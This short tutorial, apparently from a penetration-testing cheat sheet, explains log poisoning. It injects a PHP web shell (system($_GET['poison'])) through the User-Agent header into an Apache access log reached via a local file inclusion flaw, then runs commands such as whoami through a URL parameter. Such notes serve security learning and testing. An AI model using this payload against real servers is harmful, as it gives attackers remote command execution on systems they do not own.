# Log Poisoning
Log poisoning is a common technique used to gain a reverse shell from a LFI vulnerability. To make it work an attacker attempts to inject malicious input to the server log. The directory of the file should have read and execute permissions

Insert the following malicious code in the user agent field. The PHP command will allow us to execute system commands by parsing the input to a GET parameter called `poison`

```bash
GET /v1/signin.php?page=/var/log/apache2/access.log HTTP/1.1
Host: example.com
User-Agent: Mozilla <?php system($_GET['poison']); ?> Firefox
Accept: text/html
Connection: close
```

Forward the request and add your parameter to the link.

```text
http://target.com/v1/example.php?page=/var/log/apache2/access.log&poison=whoami
```